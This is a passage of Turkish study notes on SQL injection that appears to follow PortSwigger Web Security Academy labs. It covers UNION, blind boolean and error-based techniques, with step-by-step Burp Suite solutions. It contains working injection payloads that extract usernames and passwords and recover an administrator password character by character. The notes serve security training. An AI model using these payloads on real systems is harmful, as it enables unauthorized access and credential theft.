' UNION SELECT NULL,NULL,NULL--
etc.
```

Null sayısı column sayısıyla eşleşmezse, veritabanı aşağıdaki gibi bir hata döndürür:

```
UNION, INTERSECT veya EXCEPT operatörü kullanılarak birleştirilen tüm sorgular, hedef listelerinde eşit sayıda ifadeye sahip olmalıdır.
```

**`NULL`** değerlerini, inject edilen **`SELECT`** sorgusunun döndürdüğü değerler olarak kullanıyoruz, çünkü **orijinal** ve **enjekte edilen** sorguların **column** veri tiplerinin uyumlu olması gerekir. **`NULL`**, her yaygın veri tipine dönüştürülebilir, bu nedenle **column** sayısı doğru olduğunda payload'ın başarılı olma olasılığını en üst düzeye çıkarır.

**`ORDER BY`** tekniğinde olduğu gibi, uygulama veritabanı hatasını HTTP response'unda döndürebilir, ancak bunun yerine genel bir hata döndürebilir veya hiç sonuç vermeyebilir. **`NULL`** sayısı, **column** sayısıyla eşleştiğinde, veritabanı her **column** için **NULL** değerleri içeren ek bir satır döndürür. Bu durumun **HTTP response'u üzerindeki etkisi**, uygulamanın koduna bağlıdır. Şanslıysanız, response içinde fazladan bir içerik görebilirsiniz (örneğin, bir HTML tablosunda ek bir satır). Aksi takdirde, **`NULL`** değerleri farklı bir hatayı tetikleyebilir (örneğin, **`NullPointerException`**). En kötü senaryoda ise, yanlış **`NULL`** sayısı girildiğinde oluşan response'la aynı görünür. Bu da yöntemin etkisiz hale gelmesine neden olabilir.

---

### Lab: SQL injection UNION saldırısı, sorgu tarafından döndürülen column sayısını belirleme

Bu laboratuvar, product category filtresinde bir SQL enjeksiyon açığı içeriyor. Sorgudan dönen sonuçlar uygulamanın response'unda geri döndüğü için, diğer tablolardan veri almak için bir **UNION** saldırısı kullanabilirsiniz. Böyle bir saldırının ilk adımı, sorgudan dönen **column** sayısını belirlemektir. Bu sayıyı belirledikten sonra, sonraki laboratuvarlarda tam saldırıyı oluşturmak için bu tekniği kullanabilirsiniz.

Laboratuvarı çözmek için, **`null`** değerleri içeren ek bir satır döndüren bir **SQL enjeksiyon UNION** saldırısı gerçekleştirerek sorgudan dönen **column** sayısını belirleyin.

Çözüm : 

1-Burp Suite'i kullanarak **product** kategorisi filtresini ayarlayan **request**'i yakalayın ve değiştirin. **Category** parametresini, `'+UNION+SELECT+NULL--` değeriyle değiştirin. Bir hata meydana geldiğini gözlemleyin.

![Pasted image 20250329211215.png](/img/user/resimler/Pasted%20image%2020250329211215.png)

2-**Category** parametresini değiştirerek bir **column** içeren ek bir **null** değeri ekleyin:

```
'+UNION+SELECT+NULL,NULL--
```

4-**Null** değerlerini eklemeye devam edin, hata kaybolana kadar ve yanıtın, **null** değerlerini içeren ek içerik içerdiğini görün.

![Pasted image 20250329211428.png](/img/user/resimler/Pasted%20image%2020250329211428.png)

---

### Database-specific syntax

Oracle'da, her **SELECT** sorgusu **FROM** anahtar kelimesini kullanmalı ve geçerli bir tablo belirtmelidir. Oracle'da bu amaçla kullanılabilecek built-in bir tablo vardır, adı **dual**'dır. Bu nedenle, Oracle'daki enjeksiyon sorguları şu şekilde olmalıdır:

`' UNION SELECT NULL FROM DUAL--`

Açıklamalar, enjeksiyon noktasının ardından orijinal sorgunun geri kalan kısmını yorumlamak için çift tire (**`--`**) yorum dizisini kullanır. MySQL'de ise çift tire dizisinin ardından bir boşluk gelmelidir. Alternatif olarak, yorum olarak işaretlemek için **`#`** karakteri de kullanılabilir.

### Yararlı bir veri türüne sahip column'larını bulmak

Bir SQL injection UNION saldırısı, enjekte edilmiş bir sorgudan sonuçları almanıza olanak tanır. Çekmek istediğiniz ilginç veriler genellikle `string`  formatında olur. Bu, orijinal sorgu sonuçlarında bir veya daha fazla column'un veri türünün string veri ile uyumlu olması gerektiği anlamına gelir.

Gerekli column sayısını belirledikten sonra, her column'u test etmek için her birine sırasıyla string verisi yerleştiren bir dizi `UNION SELECT` payload'ı gönderebilirsiniz. Örneğin, sorgu dört column döndürüyorsa, şunları gönderebilirsiniz:

```
' UNION SELECT 'a',NULL,NULL,NULL--  
' UNION SELECT NULL,'a',NULL,NULL--  
' UNION SELECT NULL,NULL,'a',NULL--  
' UNION SELECT NULL,NULL,NULL,'a'--
```

Eğer column veri türü string veri ile uyumlu değilse, inject'de edilen sorgu bir veritabanı hatasına neden olur, örneğin:

`Conversion failed when converting the varchar value 'a' to data type int.`

`'a' varchar değeri int veri türüne dönüştürülürken dönüştürme başarısız oldu.`

Eğer bir hata oluşmazsa ve uygulamanın yanıtı, enjekte edilen string değerini içeren ek içerik içeriyorsa, o zaman ilgili column string veri almak için uygundur.

---
### Laboratuvar: SQL injection UNION saldırısı, text içeren bir column bulma

Bu laboratuvar, **product** **category** filtresindeki bir SQL injection zafiyetini içermektedir. **Query** sonucunda dönen veriler, uygulamanın yanıtında yer aldığı için, diğer tablolardan veri almak amacıyla bir UNION saldırısı kullanılabilir. Böyle bir saldırıyı oluşturmak için, ilk olarak **query** sonucunda dönen **column** sayısını belirlemeniz gerekmektedir. Bunu, önceki laboratuvarda öğrendiğiniz bir teknikle yapabilirsiniz. Sonraki adım, string veri ile uyumlu bir **column** bulmaktır.

Laboratuvar, **query** sonuçlarında görünmesi gereken rastgele bir değer sağlayacaktır. Laboratuvarı çözmek için, sağlanan değeri içeren ek bir satır döndüren bir SQL injection UNION saldırısı gerçekleştirin. Bu teknik, hangi **column**'ların string veri ile uyumlu olduğunu belirlemenize yardımcı olacaktır.

Çözüm: 

Burp Suite'i kullanarak **product category** filtresini ayarlayan **request**'i yakalayın ve değiştirin.

1. **Query** tarafından döndürülen **column** sayısını belirleyin. **Query**'nin üç **column** döndürdüğünü doğrulamak için **category** parametresinde aşağıdaki **payload**'ı kullanın:

```
'+UNION+SELECT+NULL,NULL,NULL--
```

![Pasted image 20250329214904.png](/img/user/resimler/Pasted%20image%2020250329214904.png)

2. Laboratuvar tarafından sağlanan rastgele değeri içeren bir **query** çalıştırmak için her bir NULL değerini sırayla değiştirin. Örneğin:

```
'+UNION+SELECT+'abcdef',NULL,NULL--
```

![Pasted image 20250329214958.png](/img/user/resimler/Pasted%20image%2020250329214958.png)

3. Eğer bir hata alırsanız, değeri bir sonraki **column**'a yerleştirin ve tekrar deneyin.

![Pasted image 20250329215105.png](/img/user/resimler/Pasted%20image%2020250329215105.png)

---

### İlginç verileri almak için SQL injection UNION saldırısı kullanma

Orijinal **query** tarafından döndürülen **column** sayısını belirlediğinizde ve hangi **column**'ların string veri tutabileceğini bulduğunuzda, artık önemli verileri alabilirsiniz.

Diyelim ki:

- Orijinal **query** iki **column** döndürüyor ve her ikisi de string veri tutabiliyor.
- **Injection point**, `WHERE` koşulundaki tırnak içinde bir string.
- **Database**, `users` adında bir tablo ve içinde `username` ve `password` **column**'larını içeriyor.

Bu durumda, `users` tablosunun içeriğini aşağıdaki **payload** ile çekebilirsiniz:

```
' UNION SELECT username, password FROM users--
```

Bu saldırıyı gerçekleştirmek için, `users` adında bir tablonun ve içinde `username` ile `password` adında iki **column**'un bulunduğunu bilmeniz gerekir. Eğer bu bilgilere sahip değilseniz, tablo ve **column** adlarını tahmin etmeniz gerekir. Ancak, modern **databases**, yapısını inceleyerek hangi tabloların ve **column**'ların bulunduğunu belirlemenizi sağlayan yöntemler sunar.

---

### Laboratuvar: SQL injection UNION saldırısı, diğer tablolardan veri alma

Bu lab, **product** **category** filtresinde bir **SQL injection** açığı içermektedir. **Query** sonuçları uygulamanın yanıtında döndürüldüğünden, diğer tabloların verilerini almak için bir **UNION attack** gerçekleştirebilirsiniz. Böyle bir saldırıyı oluşturmak için önceki lab'lerde öğrendiğiniz bazı teknikleri birleştirmeniz gerekmektedir.

**Database** içinde `users` adında farklı bir tablo ve `username` ile `password` adında **column**'lar bulunmaktadır.

Lab'ı çözmek için, tüm **username** ve **password** verilerini alacak bir **SQL injection UNION attack** gerçekleştirin ve ardından **`administrator`** kullanıcısı olarak giriş yapın.

Çözüm : 

1. Burp Suite kullanarak **product category** filtresini belirleyen **request**'i yakalayın ve değiştirin.

2. **Query** tarafından döndürülen **column** sayısını ve hangi **column**'ların text verisi içerdiğini belirleyin. **Query**'nin iki **column** döndürdüğünü ve her ikisinin de text içerdiğini doğrulamak için **category** parametresine aşağıdaki **payload**'ı girin:

```
'+UNION+SELECT+'abc','def'--
```

![Pasted image 20250329220657.png](/img/user/resimler/Pasted%20image%2020250329220657.png)

3. Daha sonra **users** tablosunun içeriğini almak için şu **payload**'ı kullanın:

```
'+UNION+SELECT+username,+password+FROM+users--
```

![Pasted image 20250329220725.png](/img/user/resimler/Pasted%20image%2020250329220725.png)

Uygulamanın yanıtında **username** ve **password** bilgilerini doğrulayın.

---

### Tek bir column içinde birden fazla değer alma

Bazı durumlarda, önceki örnekteki **query** yalnızca tek bir **column** döndürebilir.

Bu durumda, birden fazla değeri tek bir **column** içinde almak için **string concatenation (birleştirme)** kullanabilirsiniz. Ayırt edilebilir olması için bir **separator** ekleyebilirsiniz. Örneğin, **Oracle** üzerinde aşağıdaki input'u kullanabilirsiniz:

```
' UNION SELECT username || '~' || password FROM users--
```

Burada `||` operatörü, **Oracle**'da **string concatenation** için kullanılır. **Injected query**, **username** ve **password** alanlarını `~` karakteriyle birleştirerek döndürür.

**Query** sonuçları şu şekilde görünebilir:

```
...
administrator~s3cure
wiener~peter
carlos~montoya
...
```

Farklı **databases**, **string concatenation** işlemi için farklı sözdizimleri kullanır.

---
### Laboratuvar: SQL injection UNION saldırısı, tek bir column'da birden fazla değer alma

Bu **lab**, **product category filter** içinde bir **SQL injection** zafiyeti barındırmaktadır. **Query** sonuçları uygulamanın yanıtında döndürüldüğünden, diğer **tables** üzerindeki verileri almak için bir **UNION attack** gerçekleştirebilirsiniz.

Veritabanında **`users`** adında farklı bir **table** bulunmakta olup, **`username`** ve **password** adında **`columns`** içermektedir.

**Lab**'ı çözmek için, bir **SQL injection UNION attack** yaparak tüm **usernames** ve **passwords** bilgilerini alın ve **`administrator` user** olarak giriş yapın.

Çözüm : 

**Burp Suite** kullanarak **product category filter**'ı ayarlayan **request**'i yakalayın ve değiştirin.

1. **Query** tarafından döndürülen **column** sayısını ve hangi **columns**'un **text data** içerdiğini belirleyin.

2. **Query**'nin iki **column** döndürdüğünü ve yalnızca birinin **text** içerdiğini doğrulamak için aşağıdaki **payload**'ı **category** parametresine ekleyin:

```
'+UNION+SELECT+NULL,'abc'--
```

![Pasted image 20250329221553.png](/img/user/resimler/Pasted%20image%2020250329221553.png)

3. **Users table** içeriğini almak için aşağıdaki **payload**'ı kullanın:

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

![Pasted image 20250329221617.png](/img/user/resimler/Pasted%20image%2020250329221617.png)

4. Uygulamanın yanıtında **usernames** ve **passwords** bilgilerini doğrulayın.

---

### Blind SQL injection

Bu bölümde, blind SQL injection güvenlik açıklarını bulmaya ve kullanmaya yönelik teknikleri açıklayacağız.

**Blind SQL injection**, bir uygulamanın **SQL injection**'a karşı savunmasız olduğu ancak **HTTP responses** içinde ilgili **SQL query** sonuçlarını veya **database errors** ayrıntılarını içermediği durumlarda meydana gelir.

**`UNION` attacks** gibi birçok teknik, **blind SQL injection** açıklarına karşı etkili değildir. Bunun nedeni, enjekte edilen **query** sonuçlarının uygulamanın yanıtlarında görülebilmesine dayanıyor olmalarıdır.

Yine de, **blind SQL injection** kullanarak **unauthorized data**'ya erişmek mümkündür, ancak farklı teknikler kullanılması gerekir.


### **Blind SQL injection**'ı **koşullu yanıtlar** tetikleyerek exploit etme

Uygulama kullanımı hakkında analiz toplamak için izleme cookie'leri kullanan bir uygulama düşünün. Uygulamaya yapılan talepler aşağıdaki gibi bir cookie header içerir:

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

Bu cookie içeriği işlendiğinde, uygulama SQL sorgusu kullanarak bu kullanıcının tanınan bir kullanıcı olup olmadığını belirler:

```
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```

Bu sorgu SQL enjeksiyonuna karşı savunmasızdır, ancak sorgudan elde edilen sonuçlar kullanıcılara gösterilmez. Bununla birlikte, uygulama, sorgu herhangi bir veri döndürüp döndürmediğine bağlı olarak farklı şekilde davranır. Eğer tanınan bir TrackingId gönderilirse, sorgu veri döndürecek ve "Hoş geldiniz tekrar" mesajı yanıt içinde gösterilecektir.

Bu davranış, **blind SQL injection** zafiyetini exploit edebilmek için yeterlidir. Farklı koşullar tetikleyerek bilgi elde edebilirsiniz.

Bu exploit'in nasıl çalıştığını anlamak için, ardışık olarak şu `TrackingId` cookie değerleri içeren iki request'in gönderildiğini varsayalım:

```
…xyz' AND '1'='1
…xyz' AND '1'='2
```

İlk değer, eklenen `AND '1'='1` koşulunun doğru olması nedeniyle sorgunun veri döndürmesini sağlar. Bu nedenle "Hoş geldiniz tekrar" mesajı gösterilir.

İkinci değer, eklenen koşul yanlış olduğu için sorgu veri döndürmez. Sonuç olarak "Hoş geldiniz tekrar" mesajı gösterilmez.

Bu, her bir eklenen koşulun cevabını belirlememize ve verileri tek bir parça halinde çıkarmamıza olanak tanır.

Örneğin, "`Users`" adlı bir tablo olduğunu ve bu tablonun "`Username`" ve "`Password`" adında iki sütunu içerdiğini ve burada bir "`Administrator`" kullanıcısının olduğunu varsayalım. Bu kullanıcının şifresini, her bir karakteri birer birer test ederek belirleyebiliriz.

Bunun için şu girişi yaparak başlayabiliriz:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Bu, "Hoş geldiniz tekrar" mesajını döndürecektir, bu da eklenen koşulun doğru olduğu ve dolayısıyla şifrenin ilk karakterinin 'm'den büyük olduğu anlamına gelir.

Sonra şu girişi göndeririz:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

Bu, "Hoş geldiniz tekrar" mesajını döndürmez, bu da eklenen koşulun yanlış olduğu ve dolayısıyla şifrenin ilk karakterinin 't'den büyük olmadığı anlamına gelir.

Sonunda şu girişi göndeririz:

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Bu, "Hoş geldiniz tekrar" mesajını döndürür, böylece şifrenin ilk karakterinin 's' olduğunu doğrulamış oluruz.

Bu işlemi, Administrator kullanıcısının tam şifresini belirlemek için sistematik olarak devam ettirebiliriz.

### Not

SUBSTRING fonksiyonu bazı veritabanı türlerinde SUBSTR olarak adlandırılır.

---

### Lab: Koşullu Yanıtlarla Blind SQL Enjeksiyonu

Bu laboratuvar, bir blind SQL enjeksiyonu açığı içeriyor. Uygulama, analiz için bir takip cookie'i kullanır ve gönderilen cookie'nin değerini içeren bir SQL sorgusu gerçekleştirir.

SQL sorgusunun sonuçları döndürülmez ve herhangi bir hata mesajı gösterilmez. Ancak, sorgu herhangi bir satır döndürürse, uygulama sayfada bir "Hoş geldiniz" mesajı içerir.

Veritabanında, `kullanıcı adı` ve `şifre` column'ları sahip farklı bir "`users`" tablosu bulunmaktadır. Bu blind SQL enjeksiyonu açığını kullanarak, administrator kullanıcısının şifresini öğrenmeniz gerekiyor.

Laboratuvarı çözmek için, `administrator` kullanıcısı olarak giriş yapın.

Çözüm : 

1- Mağazanın ön sayfasını ziyaret edin ve `TrackingId` cookie'sini içeren request'i yakalamak ve değiştirmek için Burp Suite'i kullanın. Basit olması açısından, Cookie'nin orijinal değerinin `TrackingId=xyz` olduğunu varsayalım.

2- `TrackingId` cookie'sini şu şekilde değiştirerek değiştirin:

```
TrackingId=xyz' AND '1'='1
```

Response'da Welcome back (Tekrar hoş geldiniz) mesajının göründüğünü doğrulayın.

3- Şimdi değiştir:

```
TrackingId=xyz' AND '1'='2
```

![Pasted image 20250330002352.png](/img/user/resimler/Pasted%20image%2020250330002352.png)

Response'da Welcome back mesajının görünmediğini doğrulayın. Bu, tek bir boolean koşulunu nasıl test edebileceğinizi ve sonucu nasıl çıkarabileceğinizi gösterir.

4- Şimdi değiştir:

```
TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
```

Koşulun doğru olduğunu doğrulayın ve users adında bir tablo olduğunu onaylayın.

![Pasted image 20250330002432.png](/img/user/resimler/Pasted%20image%2020250330002432.png)

5- Şimdi değiştir:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

Koşulun doğru olduğunu doğrulayarak administrator adında bir kullanıcı olduğunu onaylayın.

![Pasted image 20250330002801.png](/img/user/resimler/Pasted%20image%2020250330002801.png)

6- Bir sonraki adım, administrator kullanıcısının şifresinde kaç karakter olduğunu belirlemektir. Bunu yapmak için değeri şu şekilde değiştirin:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

Bu koşul doğru olmalı ve parolanın 1 karakterden uzun olduğunu doğrulamalıdır. (20 karakterli)

![Pasted image 20250330002836.png](/img/user/resimler/Pasted%20image%2020250330002836.png)

7- Farklı şifre uzunluklarını test etmek için bir dizi takip değeri gönderin. Şunu gönderin:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
```

O zaman gönder:

```
TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
```

Ve devam edin. Bunu manuel olarak Burp Repeater kullanarak yapabilirsiniz, çünkü uzunluk muhtemelen kısa olacaktır. Koşul doğru olmamaya başladığında (yani, "`Welcome back`" mesajı kaybolduğunda), şifrenin uzunluğunu belirlemiş olursunuz ki bu da aslında 20 karakter uzunluğundadır.

8- Parolanın uzunluğunu belirledikten sonra, bir sonraki adım, değerini belirlemek için her konumdaki karakteri test etmektir. Bu çok daha fazla sayıda request içerir, bu nedenle Burp Intruder kullanmanız gerekir. Context menüsünü kullanarak üzerinde çalıştığınız isteği Burp Intruder'a gönderin.

9- Burp Intruder'da cookie değerini şu şekilde değiştirin:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

Bu, paroladan tek bir karakter çıkarmak ve bunu belirli bir değere karşı test etmek için `SUBSTRING()` fonksiyonunu kullanır. Saldırımız her bir pozisyon ve olası değer arasında geçiş yaparak her birini sırayla test edecektir.

10- Cookie değerindeki son `a` karakterinin etrafına payload pozisyon işaretleyicileri yerleştirin. Bunu yapmak için sadece `a`'yı seçin ve `Add §` düğmesine tıklayın. Daha sonra cookie değeri olarak aşağıdakini görmelisiniz (“payload position” işaretçilerine dikkat edin):

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
```

![Pasted image 20250330004536.png](/img/user/resimler/Pasted%20image%2020250330004536.png)

11- Her pozisyondaki karakteri test etmek için, tanımladığınız payload pozisyonuna uygun payload'lar göndermeniz gerekir. Parolanın yalnızca küçük harfli alfanümerik karakterler içerdiğini varsayabilirsiniz. Payload'lar yan panelinde Simple list (Basit liste) seçeneğinin seçili olduğunu kontrol edin ve Payload configuration (Payload yapılandırması) altında a - z ve 0 - 9 aralığındaki payload'ları ekleyin. Listeden ekle açılır menüsünü kullanarak bunları kolayca seçebilirsiniz.

12- Doğru karakterin ne zaman gönderildiğini anlayabilmek için, her yanıtı `Welcome back` ifadesi için greplemeniz gerekir. Bunu yapmak için Settings sekmesine tıklayarak Settings yan panelini açın. `Grep - Match` bölümünde, listedeki mevcut entryleri temizleyin, ardından `Welcome back` değerini ekleyin.

13- Start attack (Saldırıyı başlat) düğmesine tıklayarak saldırıyı başlatın.

![Pasted image 20250330005046.png](/img/user/resimler/Pasted%20image%2020250330005046.png)

14- İlk konumdaki karakterin değerini bulmak için saldırı sonuçlarını inceleyin. Sonuçlarda `Welcome back` adında bir column görmelisiniz. Satırlardan birinde bu column'da bir tik işareti olmalıdır. Bu satır için gösterilen payload, ilk konumdaki karakterin değeridir.

15- Şimdi, değerlerini belirlemek için paroladaki diğer karakter konumlarının her biri için saldırıyı yeniden çalıştırmanız yeterlidir. Bunu yapmak için, `Intruder` sekmesine geri dönün ve belirtilen ofseti 1'den 2'ye değiştirin. Daha sonra cookie değeri olarak aşağıdakileri görmelisiniz:

```
TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

16- modified attack'ı başlatın, sonuçları gözden geçirin ve ikinci ofsetteki karakteri not edin.

17- Tüm şifreyi elde edene kadar bu işleme ofset 3, 4 ve benzerlerini test ederek devam edin.

18- Browser'da, login sayfasını açmak için `My account` (Hesabım) seçeneğine tıklayın. Admin kullanıcısı olarak oturum açmak için parolayı kullanın.

---

### Error-based SQL injection

**Error-based SQL injection**, hata mesajlarını kullanarak veritabanından hassas verileri çıkarmaya veya bunları dolaylı olarak öğrenmeye dayanan bir tekniktir. Bu yöntem, veritabanının yapılandırmasına ve tetikleyebildiğiniz hata türlerine bağlı olarak değişir:

- **Boolean ifadeler üzerinden hata mesajları tetikleme:** Uygulamayı, belirli bir boolean ifadesinin sonucuna bağlı olarak özel bir hata döndürmeye zorlayabilirsiniz. Bu teknik, önceki bölümde ele aldığımız **koşullu yanıtları** kullanarak yapılan saldırılarla benzer şekilde çalışır. 

- **Hata mesajları aracılığıyla hassas verileri çıkartma:** Veritabanından dönen verileri içeren hata mesajlarını tetikleyebilirseniz, bu yöntem **blind SQL injection** saldırısını **görünür hale** getirir.


### Koşullu hataları tetikleyerek blind SQL enjeksiyonundan yararlanma

Bazı uygulamalar **SQL sorguları** çalıştırsa da, sorgunun veri döndürüp döndürmemesine bakılmaksızın uygulamanın davranışı değişmez. Önceki bölümde açıklanan teknik burada işe yaramaz, çünkü farklı **boolean koşulları enjekte etmek** uygulamanın yanıtlarını değiştirmez.

Bunun yerine, genellikle **uygulamanın SQL hatası üretmesine neden olarak farklı bir yanıt döndürmesini sağlamak** mümkündür. Sorguyu, yalnızca belirli bir koşul **doğru olduğunda** veritabanı hatası oluşturacak şekilde değiştirebilirsiniz. Çoğu zaman, veritabanı tarafından yönetilmeyen bir hata oluştuğunda, uygulamanın yanıtında **hata mesajı gibi bir farklılık** meydana gelir. Bu sayede **enjekte edilen koşulun doğruluğunu dolaylı olarak öğrenebilirsiniz**.

Bunun nasıl çalıştığını görmek için, sırayla şu **`TrackingId`** cookie değerlerini içeren iki isteğin gönderildiğini varsayalım:

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

1. **xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a**
    - 1=2 yanlış, 'a' döner, sonuç true.
    - Amaç: Sistemin normal tepkisini test etmek.
2. **xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a**
    - 1=1 doğru, 1/0 hata verir, sorgu çöker.
    - Amaç: Hata mesajı alıp açığı tespit etmek.

Bu girişler, bir koşulu test etmek ve ifadenin doğru olup olmamasına bağlı olarak farklı bir ifade döndürmek için `CASE` anahtar sözcüğünü kullanır:

İlk input ile `CASE` ifadesi '`a`' olarak değerlendirilir ve bu da herhangi bir hataya neden olmaz.

İkinci inputile `1/0` olarak değerlendirilir ve bu da sıfıra bölme hatasına neden olur.

Hata, uygulamanın HTTP yanıtında bir farklılığa neden oluyorsa, enjekte edilen koşulun doğru olup olmadığını belirlemek için bunu kullanabilirsiniz.

Bu tekniği kullanarak, her seferinde bir karakteri test ederek veri alabilirsiniz:

```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```


---

### Lab: Blind SQL injection with conditional errors

Bu laboratuvar bir blind SQL injection güvenlik açığı içermektedir. Uygulama, analitik için bir tracking cookie kullanır ve gönderilen cookie'nin değerini içeren bir SQL sorgusu gerçekleştirir.

SQL sorgusunun sonuçları döndürülmez ve uygulama, sorgunun herhangi bir satır döndürüp döndürmediğine bağlı olarak farklı bir yanıt vermez. SQL sorgusu bir hataya neden olursa uygulama özel bir hata mesajı döndürür.

Veritabanı, kullanıcı adı ve parola adlı sütunlara sahip kullanıcılar adlı farklı bir tablo içerir. `Administrator` kullanıcısının parolasını bulmak için blind SQL injection güvenlik açığından yararlanmanız gerekir.

Laboratuvarı çözmek için `administrator` kullanıcısı olarak oturum açın.

Çözüm : 

1- **Hata Tespiti** : İlk olarak, **TrackingId** değerine tek bir tırnak eklenerek hata olup olmadığı test edilir:

```
TrackingId=xyz'
```

![Pasted image 20250330201252.png](/img/user/resimler/Pasted%20image%2020250330201252.png)

Eğer hata mesajı alınıyorsa, bu, **SQL syntax error** oluştuğunu gösterir.

Sonrasında, çift tırnak eklenerek test edilir:

![Pasted image 20250330201316.png](/img/user/resimler/Pasted%20image%2020250330201316.png)

Eğer hata mesajı kayboluyorsa, bu, ilk denemedeki tırnağın **query syntax'ını bozduğunu** doğrular.


2- **Veritabanı Türünü Belirleme**

Şimdi, **SQL query**'nin gerçekten yürütüldüğünü doğrulamak için geçerli bir **subquery** eklenir:

```
TrackingId=xyz'||(SELECT '')||'
```

![Pasted image 20250330201636.png](/img/user/resimler/Pasted%20image%2020250330201636.png)

Eğer hata devam ederse, **database** türüne bağlı olabilir. Oracle kullanılıyorsa, **dual** tablosu eklenerek test edilir:

```
TrackingId=xyz'||(SELECT '' FROM dual)||'
```

![Pasted image 20250330201703.png](/img/user/resimler/Pasted%20image%2020250330201703.png)

Hata kaybolursa, **database** büyük ihtimalle Oracle’dır.

Sonrasında, var olmayan bir tablo sorgulanarak hata kontrol edilir:

```
TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'
```

Bu, **database**'in sorguları gerçekten çalıştırıp çalıştırmadığını anlamak için kullanılır.

![Pasted image 20250330202724.png](/img/user/resimler/Pasted%20image%2020250330202724.png)


3- **Tablo Varlığını Test Etme**

Eğer sorgular geçerli bir şekilde çalışıyorsa, var olup olmadığını kontrol etmek için **users** tablosuna sorgu yapılır:

![Pasted image 20250330202825.png](/img/user/resimler/Pasted%20image%2020250330202825.png)

Eğer hata alınmazsa, **users** tablosu büyük ihtimalle mevcuttur.


4- **Koşullu Hata Üretme**

Şimdi, **CASE** kullanılarak bir hata üretilip üretilmediği test edilir:

Geçerli bir durum test edilir:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Bu, hata üretir.

![Pasted image 20250330203721.png](/img/user/resimler/Pasted%20image%2020250330203721.png)

Şimdi, geçersiz bir koşul test edilir:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

Eğer hata kaybolursa, bu yöntemin **boolean-based blind SQL Injection** için kullanılabileceğini gösterir.

![Pasted image 20250330203744.png](/img/user/resimler/Pasted%20image%2020250330203744.png)


5- **Kullanıcı Adını Test Etme**

Şimdi, belirli bir **username**'in var olup olmadığını test etmek için sorgu oluşturulur:

```
TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Eğer hata alınıyorsa, **administrator** kullanıcısının var olduğu anlamına gelir.

![Pasted image 20250330203851.png](/img/user/resimler/Pasted%20image%2020250330203851.png)


6- **Şifre Uzunluğunu Belirleme**

Şifre uzunluğunu bulmak için adım adım test yapılır:

```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

![Pasted image 20250330204610.png](/img/user/resimler/Pasted%20image%2020250330204610.png)

![Pasted image 20250330204623.png](/img/user/resimler/Pasted%20image%2020250330204623.png)

Eğer hata alınıyorsa, şifre en az **2 karakter** uzunluğundadır. Bu işlem, **LENGTH(password)>2**, **LENGTH(password)>3** şeklinde devam ettirilerek şifrenin tam uzunluğu belirlenir. Bu senaryoda, şifre uzunluğu **20 karakter** olarak bulunur.


7- **Karakterleri Teker Teker Çözme**

Şifrenin her karakterini belirlemek için **SUBSTR()** fonksiyonu kullanılır:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Burada:
* **SUBSTR(password,1,1)** → Şifrenin 1. karakterini alır.
* Eğer 1. karakter **'a'** ise, **TO_CHAR(1/0)** çalışır ve hata alınır.

Bu işlem, **a-z ve 0-9** arasında denenerek tekrarlanır. **Burp Intruder** kullanılarak otomatikleştirilir:

**Payload pozisyonu** işaretlenir:

```
TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Payload listesi** a-z ve 0-9 olacak şekilde ayarlanır.

**Attack başlatılır**, HTTP **500** dönen satırdaki karakter doğru karakterdir.

![Pasted image 20250330210942.png](/img/user/resimler/Pasted%20image%2020250330210942.png)

Bu işlem şifrenin tüm karakterleri için tekrarlanır. Sonunda **administrator** kullanıcısının şifresi tamamen çıkarılır.

Bulunan şifre ile giriş sayfasına gidilip, **administrator** hesabına erişim sağlanır.

---

### Verbose SQL error messages aracılığıyla hassas verilerin ayıklanması

Veritabanının yanlış yapılandırılması bazen ayrıntılı hata mesajlarına neden olur. Bunlar bir saldırgan için yararlı olabilecek bilgiler sağlayabilir. Örneğin, bir id parametresine tek bir tırnak işareti eklendikten sonra ortaya çıkan aşağıdaki hata mesajını düşünün:

```
"52. pozisyonda başlayan string literal tamamlanmamış. Beklenen karakter eksik. Hata, `SELECT * FROM tracking WHERE id = '''` sorgusunda oluştu."
```

```
